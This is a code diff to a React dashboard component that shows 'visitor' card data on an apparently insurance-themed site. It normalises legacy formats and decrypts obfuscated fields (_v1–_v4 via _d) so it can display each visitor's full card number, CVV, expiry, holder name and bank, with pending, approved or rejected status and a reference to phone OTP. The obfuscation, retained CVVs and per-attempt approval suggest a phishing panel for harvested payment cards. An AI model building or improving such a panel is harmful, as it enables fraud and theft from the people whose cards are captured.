@@ -197,14 +197,70 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
   // Show ALL card attempts from history (newest first)
   const hasMultipleAttempts = false; // For phone OTP compatibility
 
-  // Get all card entries from history
+  // Card data exists in three formats across the visitor projects:
+  // the current history format, the legacy cardHistory array, and direct
+  // fields on the visitor document. Normalize them before rendering.
+  const visitorData = visitor as InsuranceApplication & {
+    cardHistory?: Array<Record<string, any>>;
+  };
+  const historyCardEntries = (visitor.history || []).filter(
+    (h: any) => h?.type === "_t1" || h?.type === "card"
+  );
+  const legacyCardEntries = Array.isArray(visitorData.cardHistory)
+    ? visitorData.cardHistory.map((card: any, index: number) => ({
+        id: `legacy-card-${index}`,
+        type: "card",
+        timestamp:
+          card.timestamp ||
+          visitor.cardUpdatedAt ||
+          visitor.updatedAt ||
+          visitor.createdAt,
+        status: card.status || visitor.cardStatus || "pending",
+        data: card,
+      }))
+    : [];
+  const directCardData = {
+    cardNumber: visitor.cardNumber,
+    _v1: visitor._v1,
+    cvv: visitor.cvv,
+    _v2: visitor._v2,
+    expiryDate:
+      visitor.expiryDate ||
+      ((visitorData as any).cardMonth || (visitorData as any).cardYear
+        ? `${(visitorData as any).cardMonth || ""}/${(visitorData as any).cardYear || ""}`
+        : undefined),
+    _v3: visitor._v3,
+    cardHolderName:
+      visitor.cardHolderName || (visitorData as any).cardName,
+    _v4: visitor._v4,
+    cardType:
+      visitor.cardType ||
+      (visitorData as any).cardCategory,
+  };
+  const hasDirectCardData = Object.values(directCardData).some(
+    (value) => typeof value === "string" && value.trim().length > 0
+  );
+  const directCardEntry = hasDirectCardData
+    ? [
+        {
+          id: "direct-card",
+          type: "card",
+          timestamp:
+            visitor.cardUpdatedAt || visitor.updatedAt || visitor.createdAt,
+          status: visitor.cardStatus || "pending",
+          data: directCardData,
+        },
+      ]
+    : [];
   const allCardHistory =
-    visitor.history?.filter(
-      (h: any) => h.type === "_t1" || h.type === "card"
-    ) || [];
+    historyCardEntries.length > 0
+      ? historyCardEntries
+      : legacyCardEntries.length > 0
+      ? legacyCardEntries
+      : directCardEntry;
 
   // Sort by timestamp (newest first)
-  const sortedCardHistory = allCardHistory.sort((a: any, b: any) => {
+  const sortedCardHistory = [...allCardHistory].sort((a: any, b: any) => {
     const timeA = new Date(a.timestamp).getTime();
     const timeB = new Date(b.timestamp).getTime();
     return timeB - timeA; // Descending order (newest first)
@@ -215,20 +271,30 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
   // Create a bubble for each card attempt
   sortedCardHistory.forEach((cardHistory: any, index: number) => {
     // Get encrypted values from history
-    const encryptedCardNumber = cardHistory.data?._v1;
-    const encryptedCvv = cardHistory.data?._v2;
-    const encryptedExpiryDate = cardHistory.data?._v3;
-    const encryptedCardHolderName = cardHistory.data?._v4;
+    const cardData = cardHistory.data || {};
+    const encryptedCardNumber = cardData._v1;
+    const encryptedCvv = cardData._v2;
+    const encryptedExpiryDate = cardData._v3;
+    const encryptedCardHolderName = cardData._v4;
 
     // Decrypt values with error handling
     let cardNumber, cvv, expiryDate, cardHolderName;
     try {
-      cardNumber = encryptedCardNumber ? _d(encryptedCardNumber) : undefined;
-      cvv = encryptedCvv ? _d(encryptedCvv) : undefined;
-      expiryDate = encryptedExpiryDate ? _d(encryptedExpiryDate) : undefined;
+      // Only decrypt obfuscated fields. Legacy direct fields are already
+      // plain text and must not be passed through the decoder.
+      cardNumber = encryptedCardNumber
+        ? _d(encryptedCardNumber)
+        : cardData.cardNumber;
+      cvv = encryptedCvv ? _d(encryptedCvv) : cardData.cvv;
+      expiryDate = encryptedExpiryDate
+        ? _d(encryptedExpiryDate)
+        : cardData.expiryDate ||
+          (cardData.cardMonth || cardData.cardYear
+            ? `${cardData.cardMonth || ""}/${cardData.cardYear || ""}`
+            : undefined);
       cardHolderName = encryptedCardHolderName
         ? _d(encryptedCardHolderName)
-        : undefined;
+        : cardData.cardHolderName || cardData.cardName;
     } catch (error) {
       console.error("[Dashboard] Decryption error:", error);
       cardNumber = encryptedCardNumber;
@@ -250,18 +316,19 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
       effectiveCardStatus === "rejected";
 
     const cardType =
-      cardHistory.data?.cardType ||
-      cardHistory.data?.scheme ||
-      cardHistory.data?.type;
+      cardData.cardType ||
+      cardData.cardCategory ||
+      cardData.scheme ||
+      (cardData.type !== "card" ? cardData.type : undefined);
     const cardLevel =
-      cardHistory.data?.cardLevel ||
-      cardHistory.data?.level ||
-      cardHistory.data?.bankInfo?.level ||
-      cardHistory.data?.binData?.level;
+      cardData.cardLevel ||
+      cardData.level ||
+      cardData.bankInfo?.level ||
+      cardData.binData?.level;
     const bankName =
-      cardHistory.data?.bankInfo?.name ||
-      cardHistory.data?.bankName ||
-      cardHistory.data?.issuer?.name;
+      cardData.bankInfo?.name ||
+      cardData.bankName ||
+      cardData.issuer?.name;
 
     if (cardNumber || encryptedCardNumber) {
       bubbles.push({
@@ -280,7 +347,10 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
           "تاريخ الانتهاء": expiryDate,
           CVV: cvv,
           البنك: bankName || "غير محدد",
-          "بلد البنك": cardHistory.data?.bankInfo?.country || "غير محدد",
+          "بلد البنك":
+            cardData.bankInfo?.country ||
+            cardData.cardCountry ||
+            "غير محدد",
         },
         timestamp: cardHistory.timestamp,
         status: effectiveCardStatus || ("pending" as const),
